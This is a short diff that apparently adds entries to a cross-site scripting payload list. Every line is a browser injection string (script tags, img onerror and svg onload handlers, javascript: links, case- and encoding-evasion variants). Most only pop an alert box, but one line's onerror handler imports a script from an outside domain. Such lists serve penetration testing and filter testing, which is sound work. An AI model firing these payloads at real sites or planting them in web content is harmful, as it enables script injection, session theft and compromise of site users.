@@ -1,1 +1,14 @@
 %22%3E%3Cscript%3Ealert(1)%3C/script%3E
+<img src=totallyfake onerror=import(‘//domain.com/‘);//
+'-alert(1)-';"-alert(2)-"//"><svg/onload=alert(3)>
+;*/'"><img%20src=X%20onerror=CoNfirm(0)>//&/*
+<a href="javascript:alert(document.domain)">test.</a> 
+'>"><svg/onload=alert(1)>
+"><img src=1 onerror=alert(1)> 
+<h1/onmouseover=alert(document.domain)>Xss
+javascript:alert(1) and "><svg/onload=alert(1)>
+<script>alert(1)</script>
+<svg onload=confirm(1)>
+Java%SCript:alert(0)
+<img src=x onerror=alert(1)>
+"><button onclick="alert(9+9)">click me</button>
